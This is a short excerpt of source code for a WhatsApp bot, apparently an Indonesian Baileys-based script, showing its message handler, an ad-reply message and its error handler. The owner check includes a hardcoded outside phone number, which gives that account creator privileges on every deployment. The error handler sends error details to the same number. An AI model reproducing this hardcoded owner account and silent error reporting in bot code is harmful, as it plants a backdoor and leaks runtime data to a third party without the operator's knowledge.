...
module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        ...
        const isCreator = [botNumber, ...global.owner, '6282384888024@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
...
conn.sendMessage(m.chat, {
    ...
    contextInfo: {
      externalAdReply: {
        ...
        body: "Vegeta",
        thumbnailUrl: "https://telegra.ph/file/1d11fb2e0a53a74771026.jpg",
        sourceUrl: "https://chat.whatsapp.com/EZ1kBHmdS3B1dQb4EeoaQ5",
        mediaType: 1,
...
let e = String(err)
conn.sendMessage("6282384888024@s.whatsapp.net", { text: "👋🏻 Hello developer, ada yang error nih! di bagian " + util.format(e), 
contextInfo:{
